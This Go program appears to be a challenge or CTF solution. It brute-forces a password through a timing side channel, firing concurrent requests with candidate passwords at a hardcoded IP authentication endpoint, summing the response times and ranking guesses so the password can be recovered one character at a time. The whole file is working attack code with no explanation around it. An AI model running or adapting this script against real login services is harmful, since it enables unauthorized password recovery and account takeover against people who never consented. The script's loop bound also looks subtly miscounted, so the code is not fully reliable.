package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"sort"
	"sync"
)

type LoginData struct {
	Seed string
	Password string
}

type Response struct {
	IsValid bool
	LockURL string
	Time int32
}

type Result struct {
	Response Response
	Password string
}

type Calculation struct {
	Password string
	Time int64
}

func sendRequest(password string, r chan Result) {
	j, err := json.Marshal(LoginData{ Seed: "6e729d17d1e94b4089cafc7bf086a4c1", Password: password})

	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("GET", "http://35.246.158.51:8070/auth/v1_1", bytes.NewBuffer(j))

	if err != nil {
		panic(err)
	}

	req.Header.Add("User-Agent", "ed9ae2c0-9b15-4556-a393-23d500675d4b")
	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		panic(err)
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)

	if err != nil {
		panic(err)
	}

	res := Response{}
	err = json.Unmarshal(body, &res)

	if err != nil {
		panic(err)
	}

	if res.IsValid {
		println("///////", res.LockURL, "////////")
	}

	r <- Result{res, password}

}

func main() {
	c := make(chan Result)
	m := sync.Map{}
	curr := "4b28"

	for i := 'a'; i <= 'z'; i++ {
		for j := 0;j<5;j++ {
			go sendRequest(curr + string(i)+"a", c)
		}
	}

	for i := 'A'; i <= 'Z'; i++ {
		for j := 0;j<5;j++ {
			go sendRequest(curr + string(i)+"a", c)
		}
	}

	for i := '0'; i <= '9'; i++ {
		for j := 0;j<5;j++ {
			go sendRequest(curr + string(i)+"a", c)
		}
	}

	for i := 0; i < ('z' - 'a' + 'Z' - 'A' + '9' - '0') * 5; i++ {
		resp := <- c
		act, loaded := m.LoadOrStore(resp.Password, int64(resp.Response.Time))
		if loaded {
			m.Store(resp.Password, act.(int64) + int64(resp.Response.Time))
		}
	}

	s := make([]Calculation, 0)

	m.Range(func(key, value interface{}) bool {
		s = append(s, Calculation{key.(string), value.(int64)})
		return true
	})


	sort.Slice(s, func(i, j int) bool {
		return s[i].Time > s[j].Time
	})

	for i, e := range s {
		fmt.Printf("%d. %s - %dms\n", i, e.Password, e.Time)
	}
}